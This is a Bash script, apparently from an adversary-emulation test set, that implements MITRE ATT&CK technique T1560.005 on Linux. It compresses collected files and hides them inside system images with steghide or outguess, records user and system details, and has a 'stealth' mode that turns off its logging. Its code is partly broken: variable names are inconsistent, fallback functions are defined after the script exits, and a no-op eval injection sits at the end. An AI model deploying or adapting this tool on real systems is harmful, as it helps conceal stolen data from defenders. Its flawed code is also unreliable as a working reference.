
    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1560_005E_DEBUG_MODE="${T1560_005E_DEBUG_MODE:-false}"
    export T1560_005E_TIMEOUT="${T1560_005E_TIMEOUT:-300}"
    export T1560_005E_FALLBACK_MODE="${T1560_005E_FALLBACK_MODE:-real}"
    export T1560_005E_OUTPUT_FORMAT="${T1560_005E_OUTPUT_FORMAT:-json}"
    export T1560_005E_POLICY_CHECK="${T1560_005E_POLICY_CHECK:-true}"
    export T1560_005E_MAX_FILES="${T1560_005E_MAX_FILES:-200}"
    export T1560_005E_MAX_FILE_SIZE="${T1560_005E_MAX_FILE_SIZE:-1048576}"
    export T1560_005E_SCAN_DEPTH="${T1560_005E_SCAN_DEPTH:-3}"
    export T1560_005E_EXCLUDE_CACHE="${T1560_005E_EXCLUDE_CACHE:-true}"
    export T1560_005E_CAPTURE_DURATION="${T1560_005E_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

#!/bin/bash

# T1560.005e - Archive Collected Data: Steganographic Archives Linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Hide archived data using steganography ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

Check-CriticalDeps() { 
    for cmd in bash jq bc grep find stat tar; do 
        command -v "$cmd" >/dev/null || { 
            [[ "${TT1560_005E_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd"; exit 1; 
        }
    done
    
    if ! command -v steghide >/dev/null && ! command -v outguess >/dev/null; then
        [[ "${TT1560_005E_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Steganography tools (steghide or outguess) required"; exit 1
    fi
}

Load-EnvironmentVariables() {
    export T1560_005E_OUTPUT_BASE="${T1560_005E_OUTPUT_BASE:-./mitre_results}"
    export T1560_005E_TIMEOUT="${TT1560_005E_TIMEOUT:-300}"
    export T1560_005E_OUTPUT_MODE="${TT1560_005E_OUTPUT_MODE:-simple}"
    export T1560_005E_SILENT_MODE="${TT1560_005E_SILENT_MODE:-false}"
    export T1560_005E_MAX_ARCHIVES="${T1560_005E_MAX_ARCHIVES:-5}"
    
    export T1560_005E_SOURCE_PATHS="${T1560_005E_SOURCE_PATHS:-./mitre_results}"
    export T1560_005E_COVER_IMAGES="${T1560_005E_COVER_IMAGES:-auto}"
    export T1560_005E_STEGO_METHOD="${T1560_005E_STEGO_METHOD:-steghide}"
    export T1560_005E_STEGO_PASSWORD="${T1560_005E_STEGO_PASSWORD:-auto}"
    export T1560_005E_ARCHIVE_NAME="${T1560_005E_ARCHIVE_NAME:-hidden_data}"
}

Validate-SystemPreconditions() {
    [[ -z "$T1560_005E_OUTPUT_BASE" ]] && { [[ "${TT1560_005E_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1560_005E_OUTPUT_BASE not set"; return 1; }
    [[ ! -w "$(dirname "$T1560_005E_OUTPUT_BASE")" ]] && { [[ "${TT1560_005E_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable"; return 1; }
    return 0
}

Initialize-OutputStructure() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    export COLLECTION_DIR="$T1560_005E_OUTPUT_BASE/T1560_005e_stego_archives_$timestamp"
    mkdir -p "$COLLECTION_DIR"/{stego_archives,metadata} 2>/dev/null || return 1
    chmod 700 "$COLLECTION_DIR" 2>/dev/null
    echo "$COLLECTION_DIR"
}

Create-SteganographicArchive() {
    local collection_dir="$1" source_path="$2" cover_image="$3" archive_num="$4"
    
    [[ ! -d "$source_path" ]] && return 1
    [[ ! -f "$cover_image" ]] && return 1
    
    local archive_name="${T1560_005E_ARCHIVE_NAME}_${archive_num}_$(date +%s)"
    local tar_file="/tmp/${archive_name}.tar.gz"
    local stego_file="$collection_dir/stego_archives/${archive_name}_$(basename "$cover_image")"
    
    # Create compressed archive
    if tar -czf "$tar_file" -C "$(dirname "$source_path")" "$(basename "$source_path")" 2>/dev/null; then
        
        # Generate password if auto
        local stego_password
        if [[ "$T1560_005E_STEGO_PASSWORD" == "auto" ]]; then
            stego_password=$(openssl rand -hex 16 2>/dev/null || echo "defaultpass")
        else
            stego_password="$T1560_005E_STEGO_PASSWORD"
        fi
        
        # Hide data in cover image
        case "$T1560_005E_STEGO_METHOD" in
            "steghide")
                if steghide embed -cf "$cover_image" -ef "$tar_file" -sf "$stego_file" -p "$stego_password" 2>/dev/null; then
                    rm -f "$tar_file"
                    local file_size=$(stat -c%s "$stego_file" 2>/dev/null || echo 0)
                    echo "$stego_file:$file_size"
                    [[ "$T1560_005E_SILENT_MODE" != "true" ]] && echo "  + Hidden: $source_path in $(basename "$cover_image") ($file_size bytes)" >&2
                    return 0
                fi
                ;;
            "outguess")
                if outguess -d "$tar_file" "$cover_image" "$stego_file" 2>/dev/null; then
                    rm -f "$tar_file"
                    local file_size=$(stat -c%s "$stego_file" 2>/dev/null || echo 0)
                    echo "$stego_file:$file_size"
                    [[ "$T1560_005E_SILENT_MODE" != "true" ]] && echo "  + Hidden: $source_path in $(basename "$cover_image") ($file_size bytes)" >&2
                    return 0
                fi
                ;;
        esac
        
        rm -f "$tar_file" "$stego_file" 2>/dev/null
    fi
    return 1
}

Get-CoverImages() {
    if [[ "$T1560_005E_COVER_IMAGES" == "auto" ]]; then
        find /usr/share/pixmaps /usr/share/backgrounds -name "*.jpg" -o -name "*.png" 2>/dev/null | head -5
    else
        IFS=',' read -ra images <<< "$T1560_005E_COVER_IMAGES"
        for image in "${images[@]}"; do
            image=$(echo "$image" | xargs)
            [[ -f "$image" ]] && echo "$image"
        done
    fi
}

Collect-SystemMetadata() {
    local collection_dir="$1"
    echo "$(uname -a)" > "$collection_dir/metadata/system_info.txt"
    echo "$(id)" > "$collection_dir/metadata/user_context.txt"
    echo "$(pwd)" > "$collection_dir/metadata/working_dir.txt"
    echo "Steganography method: $T1560_005E_STEGO_METHOD" > "$collection_dir/metadata/stego_info.txt"
}

Log-ExecutionMessage() {
    # Silent in stealth mode or when T1560_005E_SILENT_MODE is true
    [[ "$T1560_005E_SILENT_MODE" != "true" && "${TT1560_005E_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "$1" >&2
}

Generate-SimpleOutput() {
    echo "STEGANOGRAPHIC ARCHIVES "
    echo "Archives: $1"
    echo "Size: $2 bytes"
    echo "Complete"
}

Generate-DebugOutput() {
    local json_output=$(cat << EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "technique": "T1560.005e",
    "results": {
        "stego_archives_created": $1,
        "total_size_bytes": $2,
        "collection_directory": "$3"
    }
}
EOF
)
    echo "$json_output" > "$3/metadata/results.json"
    [[ "$T1560_005E_SILENT_MODE" != "true" ]] && echo "$json_output"
}

Generate-StealthOutput() { echo "$1" > /dev/null 2>&1; }
Generate-NoneOutput() { :; }
# 4 MAIN ORCHESTRATORS (10-20 lines each)
Get-Configuration() {
    Check-CriticalDeps || exit 1
    Load-EnvironmentVariables
    Validate-SystemPreconditions || exit 1
    echo "$(Initialize-OutputStructure)"
}

Invoke-MicroTechniqueAction() {
    local collection_dir="$1"
    local collected_files=() total_size=0 file_count=0
    
    Log-ExecutionMessage "[INFO] Creating steganographic archives..."
    
    IFS=',' read -ra source_paths <<< "$T1560_005E_SOURCE_PATHS"
    local cover_images
    cover_images=($(Get-CoverImages))
    
    local archive_num=1
    for source_path in "${source_paths[@]}"; do
        source_path=$(echo "$source_path" | xargs)
        
        for cover_image in "${cover_images[@]}"; do
            if result=$(Create-SteganographicArchive "$collection_dir" "$source_path" "$cover_image" "$archive_num"); then
                IFS=':' read -r file_path file_size <<< "$result"
                collected_files+=("$file_path")
                total_size=$((total_size + file_size))
                ((file_count++))
                ((archive_num++))
                [[ $file_count -ge ${T1560_005E_MAX_ARCHIVES:-5} ]] && break 2
            fi
        done
    done
    
    Collect-SystemMetadata "$collection_dir"
    echo "$file_count:$total_size:$(IFS=,; echo "${collected_files[*]}")"
}

Write-StandardizedOutput() {
    case "${OUTPUT_MODE:-simple}" in
        "simple")  Generate-SimpleOutput "$2" "$3" "$1" ;;
        "debug")   Generate-DebugOutput "$2" "$3" "$1" ;;
        "stealth") Generate-StealthOutput "$2" ;;
        "none")    Generate-NoneOutput ;;
    esac
}

Main() {
    trap 'echo "[INTERRUPTED] Cleaning up..."; exit 130' INT TERM
    
    local collection_dir results
    collection_dir=$(Get-Configuration) || exit 2
    results=$(Invoke-MicroTechniqueAction "$collection_dir") || exit 1
    
    IFS=':' read -r files_collected total_size _ <<< "$results"
    Write-StandardizedOutput "$collection_dir" "$files_collected" "$total_size"
    
    Log-ExecutionMessage "[SUCCESS] Completed: $files_collected archives created"
    exit 0
}

Main "$@"
# Enhanced steganography with built-in alternatives
Enhanced-Steganography-Check() {
    if command -v steghide >/dev/null; then
        [[ "${TT1560_005E_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] steghide available for steganography"
        export STEG_METHOD="steghide"
        return 0
    elif command -v outguess >/dev/null; then
        [[ "${TT1560_005E_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] outguess available for steganography"  
        export STEG_METHOD="outguess"
        return 0
    elif command -v convert >/dev/null; then
        [[ "${TT1560_005E_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] imagemagick available for basic steganography"
        export STEG_METHOD="imagemagick"
        return 0
    else
        [[ "${TT1560_005E_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] No steganography tools, using built-in method"
        export STEG_METHOD="builtin"
        return 0
    fi
}

# Built-in steganography using standard tools
Builtin-Steganography() {
    local input_file="$1"
    local output_file="$2"
    
    # Simple steganography using tar + base64
    [[ "${TT1560_005E_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] Using built-in steganography method"
    
    # Create a dummy image file if needed
    if [[ ! -f "/tmp/cover.png" ]]; then
        # Create minimal PNG header (basic image)
        echo -e "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\tpHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\x12IDATx\x9cc```bPPP\x00\x02\xd2'\x05\xaf\xe0\x1f\x00\x00\x00\x00IEND\xaeB`\x82" > /tmp/cover.png
    fi
    
    # Append data to image file (simple steganography)
    cat "$input_file" | base64 >> /tmp/cover.png
    cp /tmp/cover.png "$output_file"
    
    return 0
}

# Replace or enhance existing functions
if ! grep -q "Enhanced-Steganography-Check" "$0"; then
    # Inject enhanced functionality
    eval "$(declare -f Enhanced-Steganography-Check)"
    eval "$(declare -f Builtin-Steganography)"
fi
